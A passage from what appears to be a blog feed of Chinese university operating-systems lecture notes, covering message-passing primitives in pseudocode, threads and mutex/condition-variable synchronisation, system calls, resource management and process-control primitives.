insert(PID.massageQueue,Buffer);</span><br><span class="line">	//挂接缓冲区到目标进程的PCB上</span><br><span class="line">	signal(PID.mutexOfMQ);</span><br><span class="line">	//使用完毕,释放互斥信号量</span><br><span class="line">	signal(PID.semphoreOfMQ);</span><br><span class="line">	//添加资源信号量,使可用资源数增加</span><br><span class="line">End;</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
<h4 id="接收原语">接收原语</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Procedure Receive(RB)</span><br><span class="line">Begin</span><br><span class="line">	PID:=InternalNameOfProcess();</span><br><span class="line">	//获取本进程的PID号</span><br><span class="line">	wait(PID.semphoreOFMQ);</span><br><span class="line">	//先确认有没有可用资源</span><br><span class="line">	wait(PID.mutexOfMQ);</span><br><span class="line">	//对资源进行操作,上锁</span><br><span class="line">	remove(PID.messageQueue,Buffer_i);</span><br><span class="line">	//从缓冲区取下消息</span><br><span class="line">	signal(PID.mutexOfMQ);</span><br><span class="line">	//释放互斥信号量</span><br><span class="line">	RB.Sender:=Buffer_j.Sender;</span><br><span class="line">	RB.Size:=Buffer_j.Size;</span><br><span class="line">	RB.Text:=Buffer_j.Text;</span><br><span class="line">	//复制到接收区</span><br><span class="line">	putbuf(Buffer_j);</span><br><span class="line">	//释放缓冲区</span><br><span class="line">End;</span><br></pre></td></tr></table></figure>
<h2 id="线程">线程</h2>
<h3 id="线程的概念">线程的概念</h3>
<h4 id="线程的引入">线程的引入</h4>
<ul>
<li>进程并发机制缺陷分析
<ul>
<li>进程并发执行基础(<strong>资源拥有与调度的基本单位</strong>)</li>
<li>进程创建、切换和撤销等操作的时空开销较大</li>
<li>进程并发执行程度及进程间通信效率受限</li>
</ul></li>
<li>系统并发进一步提高客观需求</li>
<li>对策
<ul>
<li>资源的拥有与调度分派两种属性的分离
<ul>
<li>进程拥有资源、内存空间</li>
<li>线程拥有处理器调度</li>
</ul></li>
</ul></li>
</ul>
<h4 id="线程的特征">线程的特征</h4>
<ul>
<li>轻型实体及共享进程资源</li>
<li>独立调度和分派的基本单位</li>
<li>创建、撤销、切换等系统开销</li>
<li>地址空间及通信效率</li>
<li>系统的并发执行程度大大提高</li>
</ul>
<h3 id="线程的控制同步与通信">线程的控制、同步与通信</h3>
<h4 id="线程的控制">线程的控制</h4>
<ul>
<li>线程的基本属性
<ul>
<li>线程标识符、寄存器状态、堆栈及专有存储器</li>
<li>线程状态、优先级与信号屏蔽</li>
</ul></li>
<li>线程的创建和终止
<ul>
<li>初始化线程</li>
<li>线程创建函数或系统调用</li>
<li>线程完成型终止与被被迫强制性终止</li>
<li>被终止线程重新恢复运行</li>
</ul></li>
</ul>
<h4 id="线程间的同步和通信">线程间的同步和通信</h4>
<ul>
<li>信号量机制
<ul>
<li>私有信号量/共有信号量</li>
</ul></li>
<li>互斥锁
<ul>
<li>实现资源互斥使用的简单极致</li>
<li>lock/unlock 两种状态和原语操作</li>
<li>适合于高频使用的<strong>关键共享数据</strong>和<strong>程序段</strong></li>
</ul></li>
<li>条件变量与互斥锁
<ul>
<li>互斥锁与特定条件变量相联系</li>
<li>互斥锁用于短期锁定,保证互斥进入临界区</li>
<li>条件变量用于长期等待,直至所得呢个资源可用</li>
</ul></li>
</ul>
<h3
id="基于互斥锁和条件变量的线程同步">基于互斥锁和条件变量的线程同步</h3>
<h4 id="访问请求资源入口">访问请求资源入口</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Lock(mutex);</span><br><span class="line">//互斥锁上锁</span><br><span class="line">Check data structure of Resource;</span><br><span class="line">//检查是否可以使用 </span><br><span class="line">if Resource is busy</span><br><span class="line">	begin</span><br><span class="line">	Unlock(mutex);</span><br><span class="line">	//方便其他线程检查状态,能够对资源进程访问</span><br><span class="line">	wait(condition_variable);</span><br><span class="line">	//这条语句会等待到资源不忙结束,执行下面的操作</span><br><span class="line">	Lock(mutex);</span><br><span class="line">	//非常关键,因为下面要进行对资源的操作</span><br><span class="line">	end</span><br><span class="line">	</span><br><span class="line">Mark resource as busy;</span><br><span class="line">Unlock(mutex);</span><br></pre></td></tr></table></figure>
<h4 id="访问资源结束">访问资源结束</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Lock(mutex);</span><br><span class="line">Mark resource as free;</span><br><span class="line">Unlock(mutex);</span><br><span class="line">wakeup(condition_variable);</span><br></pre></td></tr></table></figure>
<h3 id="线程实现方式">线程实现方式</h3>
<h4 id="线程实现方式-1">线程实现方式</h4>
<ul>
<li>内核支持线程
<ul>
<li>依赖于内核及其中的线程控制块(任务数据区:PTDA)
<ul>
<li>可以真正实现处理机的调度和分配在线程级别上</li>
</ul></li>
</ul></li>
<li>用户级线程
<ul>
<li>仅存在于用户空间之中,与内核无关
<ul>
<li>没办法实现处理机和调度分配在线程级别</li>
</ul></li>
</ul></li>
<li>实现方式比较
<ul>
<li>操作系统要求、系统开销与性能、调度算法灵活性、并发线程数量及书记效果</li>
<li>系统调用阻塞连锁效应</li>
<li>时钟中断与轮转调度可行性</li>
<li>线程调度与执行时间</li>
</ul></li>
</ul>
<h4
id="用户级线程模型1-运行管理系统run-time-system">用户级线程模型1-运行管理系统（Run-Time
System）</h4>
<h4
id="用户级线程模型2-轻型进程solaris">用户级线程模型2-轻型进程（Solaris）</h4>
]]></content>
  </entry>
  <entry>
    <title>操作系统第三节课笔记-操作系统接口</title>
    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%89%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/</url>
    <content><![CDATA[<a href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%89%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%89%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3.pdf" title="操作系统第三节课笔记-操作系统接口pdf文档下载">操作系统第三节课笔记-操作系统接口pdf文档下载</a>
<span id="more"></span>
<h1 id="操作系统接口">操作系统接口</h1>
<h2 id="用户接口">用户接口</h2>
<h3 id="用户接口分类">用户接口分类</h3>
<ul>
<li>基于表现形式划分
<ul>
<li>用户交互接口
<ul>
<li>CLI：文本界面，命令窗口(联/脱机命令接口)</li>
<li>GUI：图形化用户接口(图形化操作界面)</li>
</ul></li>
<li>用户程序接口(方便用户调用访问系统资源，由一组系统调用(System
call)组成</li>
</ul></li>
<li>基于使用者类型划分
<ul>
<li>本地用户接口</li>
<li>远程用户接口(网络用户接口)</li>
</ul></li>
</ul>
<h3 id="联机命令接口">联机命令接口</h3>
<ul>
<li><p>一组联机命令</p>
<ul>
<li>内部命令</li>
<li>外部命令</li>
</ul></li>
<li><p>键盘处理程序</p></li>
<li><p>命令解释程序</p></li>
</ul>
<h4 id="联机命令格式与分类">联机命令格式与分类</h4>
<ul>
<li><p>联机命令格式</p>
<p><code>&lt;命令&gt; [&lt;可选项&gt;] &lt;参数&gt;</code></p></li>
<li><p>联机命令类型</p>
<ul>
<li>系统访问类</li>
<li>磁盘操作类</li>
<li>网络通信类</li>
<li><strong>输入输出重定向</strong>、<strong>管道</strong>、过滤命令</li>
<li><strong>批处理方式</strong>(批处理文件/脚本)</li>
</ul></li>
</ul>
<h3 id="键盘终端处理程序">键盘终端处理程序</h3>
<ul>
<li><p>基本功能</p>
<ul>
<li>接收用户从终端输入的字符
<ul>
<li>面向字符/行方式</li>
</ul></li>
<li>管理字符缓冲
<ul>
<li>专用缓冲区/公用缓冲区</li>
</ul></li>
<li>将字符打印到屏幕
<ul>
<li>硬件/软件实现方式</li>
</ul></li>
</ul>
<p>特殊字符处理(中断/清屏/恢复jobs)</p></li>
</ul>
<h3 id="图形化用户接口">图形化用户接口</h3>
<h4 id="图形化接口元素">图形化接口元素</h4>
<ul>
<li>桌面、鼠标、图标</li>
<li>窗口、标题栏、工具栏、菜单栏</li>
<li>菜单
<ul>
<li>弹出式(右键菜单等)</li>
<li>下拉式(菜单栏的下拉菜单)</li>
</ul></li>
<li>对话框</li>
</ul>
<h4 id="图形化接口特点">图形化接口特点</h4>
<ul>
<li>简单,直观</li>
<li>多屏,多窗口</li>
<li>即使交互</li>
<li>传递参数信息量大</li>
</ul>
<h4 id="图形化接口的实现及运行机制">图形化接口的实现及运行机制</h4>
<ul>
<li>面向对象的程序设计方法</li>
<li>消息产生、传递及处理</li>
<li>事件驱动方式</li>
</ul>
<h2 id="系统调用">系统调用</h2>
<h3 id="系统调用基本概念">系统调用基本概念</h3>
<h5 id="linux-系统调用列表"><a
href="https://www.ibm.com/developerworks/cn/linux/kernel/syscall/part1/appendix.html">Linux
系统调用列表</a></h5>
<ul>
<li>定义
<ul>
<li>系统过程-&gt;系统服务-&gt;系统调用命令</li>
</ul></li>
<li>与普通过程调用的区别
<ul>
<li>运行在不同的系统状态</li>
<li>软中断进入机制</li>
<li>返回及重新调度问题</li>
<li>嵌套调用</li>
</ul></li>
</ul>
<h3 id="系统调用的类型">系统调用的类型</h3>
<ul>
<li>进程控制
<ul>
<li>进程的创建<em>fork</em><a href="#fn1" class="footnote-ref"
id="fnref1"
role="doc-noteref"><sup>1</sup></a>、结束<em>exit</em>、等待子进程结束<em>waitpid</em></li>
<li>进程属性设置<em>pid</em>与获取</li>
<li>执行一个文件<em>exec</em></li>
</ul></li>
<li>文件操控
<ul>
<li>文件的创建<em>creat</em>、打开<em>open</em>、关闭<em>close</em>、读/写
<em>read/write</em></li>
</ul></li>
<li>进程通信-基于<em>IPC</em>
<ul>
<li>连接打开与关闭、消息收发与接收</li>
</ul></li>
<li>系统信息维护
<ul>
<li>时间设置与获取、文建访问/修改时间设置</li>
</ul></li>
</ul>
<section id="footnotes" class="footnotes footnotes-end-of-document"
role="doc-endnotes">
<hr />
<ol>
<li
id="fn1"><p>除了第一个进程[init]不是由fork创建的之外,其余所有进程都是由init
fork出来的<a href="#fnref1" class="footnote-back"
role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>大学</category>
      </categories>
  </entry>
  <entry>
    <title>操作系统第二节课笔记-处理器管理功能概要</title>
    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%A4%84%E7%90%86%E5%99%A8%E7%AE%A1%E7%90%86%E5%8A%9F%E8%83%BD%E6%A6%82%E8%A6%81/</url>
    <content><![CDATA[<a href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%A4%84%E7%90%86%E5%99%A8%E7%AE%A1%E7%90%86%E5%8A%9F%E8%83%BD%E6%A6%82%E8%A6%81/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%A4%84%E7%90%86%E5%99%A8%E7%AE%A1%E7%90%86%E5%8A%9F%E8%83%BD%E6%A6%82%E8%A6%81.pdf" title="操作系统第二节课笔记-处理器管理功能概要pdf文档下载">操作系统第二节课笔记-处理器管理功能概要pdf文档下载</a>
<span id="more"></span>
<h2 id="操作系统的处理器管理功能概要">操作系统的处理器管理功能概要</h2>
<h3 id="处理器资源-最重要的资源">处理器资源-最重要的资源</h3>
<h4 id="处理器调度-如何分配">处理器调度-如何分配</h4>
<ul>
<li>作业调度
<ul>
<li>作业后备队列选取若干作业装入内存</li>
<li>作业选择与资源分配</li>
<li>调入内存建立进程</li>
</ul></li>
<li>进程调度
<ul>
<li>就绪进程队列</li>
<li>进程选择与处理及分配</li>
<li>保存现场<a href="#fn1" class="footnote-ref" id="fnref1"
role="doc-noteref"><sup>1</sup></a>，恢复现场<a href="#fn2"
class="footnote-ref" id="fnref2"
role="doc-noteref"><sup>2</sup></a></li>
</ul></li>
<li>调度算法
<ul>
<li>先来先服务，nice值低的进程优先权高，时间轮片选择的几率更大，运行的机会更多</li>
</ul></li>
</ul>
<h4 id="进程控制">进程控制</h4>
<ul>
<li>主要任务
<ul>
<li>创建进程</li>
<li>撤销进程</li>
<li>切换进程状态</li>
</ul></li>
<li>进程控制机制
<ul>
<li><strong>原语</strong><a href="#fn3" class="footnote-ref" id="fnref3"
role="doc-noteref"><sup>3</sup></a></li>
<li><strong>进程&amp;线程</strong><a href="#fn4" class="footnote-ref"
id="fnref4" role="doc-noteref"><sup>4</sup></a></li>
</ul></li>
</ul>
<h4 id="进程同步">进程同步</h4>
<ul>
<li>主要任务
<ul>
<li>进程/现成的并发执行协调</li>
<li>互斥/同步方式</li>
<li><strong>临界资源</strong><a href="#fn5" class="footnote-ref"
id="fnref5"
role="doc-noteref"><sup>5</sup></a><strong>&amp;临界区</strong><a
href="#fn6" class="footnote-ref" id="fnref6"
role="doc-noteref"><sup>6</sup></a>
<ul>
<li>要保证各个进程互斥的访问临界资源/临界区</li>
</ul></li>
</ul></li>
<li>进程同步机制
<ul>
<li>开/关锁原语【支持简单的/短时间的互斥问题】</li>
<li>信号量机制</li>
<li>管程【高级编程概念】</li>
</ul></li>
</ul>
<h4 id="进程通信">进程通信</h4>
<ul>
<li>主要任务
<ul>
<li>进程(线程)间的信息交换</li>
</ul></li>
<li>进程通信方式
<ul>
<li>共享存储器</li>
<li>管道通信</li>
<li>消息传递系统
<ul>
<li>消息缓冲队列</li>
<li>邮箱</li>
</ul></li>
</ul></li>
</ul>
<hr />
<h3 id="内存资源管理">内存资源管理</h3>
<h4 id="内存分配">内存分配</h4>
<ul>
<li>主要任务
<ul>
<li>使程序各得其所</li>
<li>提高存储器利用率</li>
<li>适应程序和数据的动态增长需要</li>
</ul></li>
<li>内存分配机制
<ul>
<li>内存分配用数据结构</li>
<li>内存分配
<ul>
<li>连续/离散分配方式</li>
<li>静态/动态分配方式</li>
</ul></li>
<li>内存回收</li>
</ul></li>
</ul>
<h4 id="内存保护">内存保护</h4>
<ul>
<li>主要任务
<ul>
<li>首先保证内核安全，其次确保程序见互不干扰</li>
<li>存取访问控制</li>
</ul></li>
<li>内存保护机制
<ul>
<li>越界检查</li>
<li>硬件实现</li>
<li>保护方式
<ul>
<li>上下限界限寄存器</li>
<li>页号&lt;页表长度</li>
<li>段号&lt;段表长度&amp;&amp;段内地址&lt;段长</li>
<li>特权级比较</li>
</ul></li>
</ul></li>
</ul>
<h4 id="地址映射转换">地址映射/转换</h4>
<ul>
<li><p>主要任务</p>
<ul>
<li>逻辑地址转换为物理地址</li>
</ul></li>
<li><p>基本概念</p>
<ul>
<li>地址空间&amp;内存空间</li>
<li>逻辑/相对/有效地址</li>
<li>物理/绝对地址</li>
</ul></li>
<li><p>地址映射机制</p>
<ul>
<li>硬件实现</li>
<li>重定位寄存器、页表/段表、快表</li>
</ul></li>
</ul>
<h4 id="内存扩充">内存扩充</h4>
<ul>
<li><p>主要任务</p>
<ul>
<li>从逻辑上扩充内存容量</li>
</ul></li>
<li><p>内存扩充的可行性</p>
<ul>
<li><p>程序运行局部性原理</p></li>
<li><p>离散分配方式</p></li>
</ul></li>
<li><p>内存扩充机制</p>
<ul>
<li>虚拟存储技术</li>
<li>硬件(页/段表、缺页/段中断、地址变换)</li>
<li>软件(请求调入/置换功能)</li>
</ul></li>
</ul>
<hr />
<h3 id="设备管理">设备管理</h3>
<h4 id="设备分配">设备分配</h4>
<ul>
<li>主要任务
<ul>
<li>设备及相应控制器的通道的分配</li>
</ul></li>
<li>设备分配机制
<ul>
<li>设备分配用的数据结构</li>
<li>设备分配与设备分配所对应的方式</li>
<li>设备分配与回收算法</li>
<li><strong>设备独立性</strong><a href="#fn7" class="footnote-ref"
id="fnref7" role="doc-noteref"><sup>7</sup></a></li>
<li><strong>虚拟设备</strong><a href="#fn8" class="footnote-ref"
id="fnref8" role="doc-noteref"><sup>8</sup></a></li>
</ul></li>
</ul>
<h4 id="缓冲管理">缓冲管理</h4>
<ul>
<li>主要任务
<ul>
<li>管理各样的缓冲区</li>
<li>缓和CPU和I/O速度不匹配</li>
<li>提高资源利用率和系统吞吐量</li>
</ul></li>
<li>缓冲管理机制
<ul>
<li>单/双/多缓冲类型</li>
<li><strong>字符缓冲</strong><a href="#fn9" class="footnote-ref"
id="fnref9"
role="doc-noteref"><sup>9</sup></a>与<strong>盘块缓冲</strong><a
href="#fn10" class="footnote-ref" id="fnref10"
role="doc-noteref"><sup>10</sup></a></li>
<li>共用缓冲池机制</li>
</ul></li>
</ul>
<h4 id="设备处理">设备处理</h4>
<ul>
<li>主要任务
<ul>
<li>CPU与设备控制器间的通信</li>
</ul></li>
<li>设备处理过程
<ul>
<li>I/O请求提出</li>
<li>I/O请求合法性检查</li>
<li>了解设备状态</li>
<li>传递参数并设置工作方式</li>
<li>通道程序自动构成<a href="#fn11" class="footnote-ref" id="fnref11"
role="doc-noteref"><sup>11</sup></a></li>
<li>发送I/O指令和启动I/O设备</li>
<li>及时响应中断请求</li>
</ul></li>
</ul>
<hr />
<h3 id="文件管理">文件管理</h3>
<h4 id="文件存储空间管理">文件存储空间管理</h4>
<ul>
<li>主要任务
<ul>
<li>使每个文件各得其所</li>
<li>提高外存空间利用率</li>
<li>提高外存空间访问速度</li>
</ul></li>
<li>文件存储空间管理机制
<ul>
<li>存储空间所用的数据结构</li>
<li>存储空间的分配与回收功能</li>
<li>离散/连续的分配方式</li>
<li>以盘块/<strong>簇</strong><a href="#fn12" class="footnote-ref"
id="fnref12" role="doc-noteref"><sup>12</sup></a>为基本分配单位</li>
</ul></li>
</ul>
<h4 id="目录管理">目录管理</h4>
<ul>
<li>主要任务
<ul>
<li>文件的按名存取</li>
<li>提高文件查找速度</li>
<li>支持文件的重命名，共享，保护</li>
</ul></li>
<li>目录管理机制
<ul>
<li>文件控制块与索引节点(inode)</li>
<li>目录结构</li>
<li>目录检索手段</li>
</ul></li>
</ul>
<h4 id="文件的读写和存取控制">文件的读写和存取控制</h4>
<ul>
<li>文件的读写管理
<ul>
<li>从外存读取数据或将数据存入外存</li>
<li>目录检索-&gt;外存地址-&gt;读写指针-&gt;读写操作</li>
<li>文件描述符表和文件表(提高文件的读写)</li>
</ul></li>
<li>文件的存取控制
<ul>
<li>防止未经核准的用户存取文件</li>
<li>防止冒名顶替存取文件</li>
<li>防止以不正确的方式使用文件</li>
<li>系统级/用户级/文件级存取控制</li>
</ul></li>
</ul>
<h3 id="操作系统的特征">操作系统的特征</h3>
<ul>
<li>并发性·
<ul>
<li><strong>并行与并发、程序与进程/线程</strong><a href="#fn13"
class="footnote-ref" id="fnref13"
role="doc-noteref"><sup>13</sup></a></li>
</ul></li>
<li>共享性
<ul>
<li>互斥共享方式，同时访问方式，<strong>可重入码</strong><a href="#fn14"
class="footnote-ref" id="fnref14"
role="doc-noteref"><sup>14</sup></a></li>
</ul></li>
<li>虚拟性
<ul>
<li>模拟虚拟机，虚拟内存，虚拟盘，虚拟设备</li>
</ul></li>
<li>异步性
<ul>
<li>进程的执行顺序与执行时间的不确定性</li>
</ul></li>
</ul>
<h2
id="操作系统的设计原则及非结构化设计问题">操作系统的设计原则及非结构化设计问题</h2>
<h3 id="操作系统的设计原则">操作系统的设计原则</h3>
<ul>
<li>可维护性
<ul>
<li>纠错性/适应性/完善性/预防性维护</li>
</ul></li>
<li>可靠性
<ul>
<li>正确性/健壮性</li>
</ul></li>
<li>可理解性</li>
<li>可用性</li>
<li>性能
<ul>
<li>系统资源利用率及用户请求响应</li>
</ul></li>
</ul>
<h3 id="模块化操作系统的结构评价">模块化操作系统的结构评价</h3>
<ul>
<li>优点
<ul>
<li>提高了设计的正确性、可理解性和可维护性</li>
<li>增强了操作系统的可适应性</li>
<li>加速了操作系统的开发过程</li>
</ul></li>
<li>尚存改进空间方面
<ul>
<li>模块划分和接口规定难保正确和合理</li>
<li>未能区别共享资源和独占资源</li>
<li>管理差异导致模块间依赖关系复杂</li>
</ul></li>
</ul>
<hr />
<section id="footnotes" class="footnotes footnotes-end-of-document"
role="doc-endnotes">
<hr />
<ol>
<li id="fn1"><p>将当前寄存器中的内容入栈，并跳转至至下一现场<a
href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2"><p>把原寄存器中的内容从栈顶恢复到寄存器中<a href="#fnref2"
class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li
id="fn3"><p>计算机进程的控制通常由原语完成。所谓原语，一般是指由若干条指令组成的程序段，用来实现某个特定功能，在执行过程中不可被中断。<a
href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn4"><p>线程包含于进程，共享进程在内存中的资源<a href="#fnref4"
class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn5"><p>一段时间之内只能被一个进程所访问的资源叫做临界资源<a
href="#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn6"><p>临界资源的代码区叫做临界区,访问临界资源的代码栈<a
href="#fnref6" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li
id="fn7"><p>程序和设备不直接关联，程序应访问逻辑设备，便于程序移植，提高程序可扩充性，提高程序的可维护性<a
href="#fnref7" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li
id="fn8"><p>独占性质设备，设置共享，通过虚拟技术，把物理上的独占设备转换成共享设备<a
href="#fnref8" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn9"><p>对于键盘使用字符缓冲<a href="#fnref9"
class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn10"><p>对于磁盘/软盘/硬盘/使用盘块缓冲<a href="#fnref10"
class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li
id="fn11"><p>仅限于通道控制方式，通道的形成，是由驱动程序自动构成的<a
href="#fnref11" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li
id="fn12"><p>簇是由多个扇区组成的逻辑结构，每个扇区512个字节，簇的大小就是扇区的整数倍<a
href="#fnref12" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li
id="fn13"><p>并行：任何一个时间点上，多个事件同时发生；并发：一段时间内，多个事件同时发生；线程：本身不用有资源，可以共享进程的资源<a
href="#fnref13" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn14"><p>不可修改的可执行代码，大家都要对该代码调用和执行<a
href="#fnref14" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>大学</category>
      </categories>
  </entry>
  <entry>
    <title>操作系统第五节课笔记-进程控制</title>
    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%94%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
    <content><![CDATA[<a href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%94%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%94%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6.pdf" title="操作系统第五节课笔记-进程控制pdf文档下载">操作系统第五节课笔记-进程控制pdf文档下载</a>
<span id="more"></span>
<h1 id="进程控制">进程控制</h1>
<h3 id="进程控制块-pcb">进程控制块-PCB</h3>
<p>Process Control Block</p>
<ul>
<li>进程实体的一部分，拥有描述进程情况及控制进程运行所需的全部信息的记录性数据结构</li>
<li>使一个在多道程序环境下不能独立运行的程序，成为一个能独立运行的基本单位，一个能与其它进程并发执行的进程</li>
<li>操作系统<strong>控制和管理</strong>并发执行进程的依据</li>
<li>进程存在的唯一标志</li>
<li>常驻内存，且存放于操作系统开辟的专门区域-PCB区</li>
</ul>
<h4 id="进程控制块中的信息">进程控制块中的信息</h4>
<ul>
<li>进程标识符
<ul>
<li>内(pid)/外部(进程名)、父/子进程、用户标识符</li>
</ul></li>
<li>处理器调度信息
<ul>
<li>通用、PC、PSW、用户占指针寄存器</li>
</ul></li>
<li>进程调度信息
<ul>
<li>进程状态、进程优先级(静态优先级，动态优先级)、事件及其他</li>
</ul></li>
<li>进程控制信息
<ul>
<li>程序和数据地址、进程同步通信机制</li>
<li>资源清单、链接指针、进程图</li>
</ul></li>
</ul>
<h3 id="进程图进程树">进程图（进程树）</h3>
<ul>
<li>描述进程家族的有向树
<ul>
<li>结点/有向边</li>
<li>父/子进程</li>
<li>祖先进程/祖先</li>
</ul></li>
</ul>
<p>知道进程的子进程有助于在知道父进程的情况下，杀死其子进程</p>
<p>知道进程的祖先进程有助于当子进程被杀死后通知父进程</p>
<h3 id="pcb的组织方式">PCB的组织方式</h3>
<p>执行指针</p>
<p>就绪队列指针</p>
<p>阻塞队列指针</p>
<p>空闲队列指针</p>
<ul>
<li>链接方式
<ul>
<li>通过链表查询队列</li>
</ul></li>
<li>索引方式
<ul>
<li>建立索引表用于查询队列</li>
</ul></li>
</ul>
<h2 id="进程的创建与终止">进程的创建与终止</h2>
<h3 id="引起创建进程的事件">引起创建进程的事件</h3>
<ul>
<li>用户登录
<ul>
<li>分时系统中，验证为合法的终端用户登录</li>
</ul></li>
<li>作业调度
<ul>
<li>批处理系统中作业调度到某作业</li>
</ul></li>
<li>提供服务
<ul>
<li>运行中的用户程序提出某种请求</li>
</ul></li>
<li>应用请求
<ul>
<li>基于用户进程的需要由其自身创建新进程</li>
</ul></li>
</ul>
<h3 id="引起终止进程的事件">引起终止进程的事件</h3>
<ul>
<li>正常结束
<ul>
<li>批处理系统中的Halt，分时系统中的LogsOff</li>
</ul></li>
<li>异常结束
<ul>
<li>越界错误、保护错误</li>
<li>特权指令错误</li>
<li>非法指令错误</li>
<li>运行超时、等待超时</li>
<li>算数运算错、I/O故障</li>
</ul></li>
<li>外界干预
<ul>
<li>操作员或者操作系统干预
<ul>
<li>发送SIGKILL信号强制杀死</li>
</ul></li>
<li>父进程请求/终止</li>
</ul></li>
</ul>
<h3 id="进程创建过程">进程创建过程</h3>
<h4 id="create原语">Create()原语</h4>
<ol type="1">
<li>分配标识符，并申请空白进程控制块</li>
<li>为新进程的程序和数据及用户占分配必要的内存空间
<ol type="1">
<li>所需内存大小问题</li>
</ol></li>
<li>初始化进程控制快
<ol type="1">
<li>自身/父进程标识符</li>
<li>处理机状态/调度信息</li>
</ol></li>
<li>讲新进程插入到就绪队列</li>
</ol>
<h3 id="进程终止过程">进程终止过程</h3>
<h4 id="terminate原语">Terminate()原语</h4>
<ol type="1">
<li>检索被终止进程PCB，读取其进程状态</li>
<li>若其正处于执行状态，立即终止执行并设置调度标志为真，来重新调度其他进程</li>
<li>终止子孙进程</li>
<li><strong>资源归还</strong>-最重要的过程</li>
<li>一处被终止进程PCB，等待其他程序查询利用</li>
</ol>
<h2 id="进程的阻塞与唤醒">进程的阻塞与唤醒</h2>
<h3 id="引起进程阻塞的事件">引起进程阻塞的事件</h3>
<ul>
<li>请求系统服务
<ul>
<li>但不能立刻满足，需要阻塞自己等待系统服务的响应</li>
</ul></li>
<li>启动某种操作
<ul>
<li>某种动作是本进程下一个动作的前趋，不满足不能向后执行</li>
</ul></li>
<li>新数据尚未到达
<ul>
<li>相互合作的进程必须先获得另一方的进程数据才能继续</li>
</ul></li>
<li>无新工作可做
<ul>
<li>特定功能的系统进程当完成任务且当前暂无任务</li>
</ul></li>
</ul>
<h3 id="引起进程唤醒的事件">引起进程唤醒的事件</h3>
<ul>
<li>系统服务满足</li>
<li>操作完成</li>
<li>数据到达</li>
<li>新任务出现</li>
</ul>
<h3 id="进程阻塞过程">进程阻塞过程</h3>
<h4 id="block原语">Block()原语</h4>
<ol type="1">
<li>先立即停止执行，把进程控制块中的现行状态由执行状态改为阻塞状态，并将它插入到对应的阻塞队列中</li>
<li>转调度程序进程重新调度，将处理机分配给另一就绪进程，并进行切换</li>
</ol>
<h3 id="进程唤醒过程">进程唤醒过程</h3>
<h4 id="wakeup原语">Wakeup()原语</h4>
<p>首先把阻塞进程从等待该事件的阻塞进程队列中移出，将其PCB中的现行状态由阻塞改为就绪，并插入到就绪队列中</p>
<h2 id="进程的挂起与激活">进程的挂起与激活</h2>
<h3 id="进程挂起过程">进程挂起过程</h3>
<h4 id="suspend过程">Suspend()过程</h4>
<ol type="1">
<li>检查被挂起进程的状态并修改和插入到对应队列</li>
<li>复制PCB到指定域</li>
<li>若被挂进程正在执行则转向调度程序重新调度</li>
</ol>
<h3 id="进程激活过程">进程激活过程</h3>
<h4 id="activate原语">Activate()原语</h4>
<ol type="1">
<li>检查进程现行状态并修改和插队</li>
<li>若有新进程进入就绪队列并采用了抢占式调度策略，则检查和决定是否重新调度</li>
</ol>
]]></content>
      <categories>
        <category>大学</category>
      </categories>
  </entry>
  <entry>
    <title>操作系统第六节课笔记-进程同步</title>
